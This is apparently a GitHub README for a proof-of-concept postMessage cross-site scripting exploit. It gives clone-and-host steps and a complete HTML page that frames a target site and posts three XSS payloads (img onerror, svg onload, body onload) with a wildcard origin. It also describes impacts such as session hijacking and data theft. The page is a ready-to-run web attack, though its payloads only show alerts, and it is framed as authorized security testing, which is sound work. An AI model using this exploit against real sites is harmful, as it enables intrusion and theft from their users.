# PoC for PostMessage XSS

This repository contains a proof-of-concept (PoC) for a potential postMessage-based Cross-Site Scripting (XSS) vulnerability. The script sends various payloads to a target iframe once it is loaded to demonstrate how the vulnerability could be exploited.

## Description

This PoC sends different payloads to an iframe using the `postMessage` API. If the target iframe is vulnerable, the payloads will execute within the context of the iframe's domain, demonstrating an XSS vulnerability.

## Usage

### Prerequisites

- Ensure you have authorization to test the target domain.
- Host the provided HTML file on a server you control.

### Steps

1. Clone the repository:

    ```sh
    git clone https://github.com/yourusername/postmessage-xss-poc.git
    ```

2. Navigate to the repository directory:

    ```sh
    cd postmessage-xss-poc
    ```

3. Open the `index.html` file in a text editor and replace `https://redacted.com` with the actual target URL you have authorization to test.

4. Host the `index.html` file on a web server. You can use a simple HTTP server for this purpose:

    ```sh
    python -m http.server 8000
    ```

5. Open a browser and navigate to `http://localhost:8000`.

6. Observe the payloads being sent to the iframe's content window via `postMessage`. If the target iframe is vulnerable, the JavaScript payloads will execute within the context of the iframe.

## PoC Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC for PostMessage XSS</title>
</head>
<body>
    <iframe id="targetFrame" src="https://redacted.com" style="width: 100%; height: 500px;"></iframe>
    <script>
        function sendMessage(payload) {
            var targetWindow = document.getElementById('targetFrame').contentWindow;
            console.log('Sending message:', payload);
            targetWindow.postMessage(payload, "*");
        }

        document.getElementById('targetFrame').onload = function() {
            console.log('Iframe loaded, sending messages');
            sendMessage("<img src=x onerror=alert('XSS')>");
            sendMessage("<svg onload=alert('XSS')>");
            sendMessage("<body onload=alert('XSS')>");
        };

        window.addEventListener('message', function(event) {
            console.log('Received message:', event.data);
        });
    </script>
</body>
</html>


Impact

If successful, an attacker could execute arbitrary JavaScript in the context of the target iframe's domain. This could lead to session hijacking, data theft, or other malicious activities depending on the application's context and functionality.
Disclaimer

Ensure you have explicit permission to test the target domain. Unauthorized testing can lead to legal consequences.
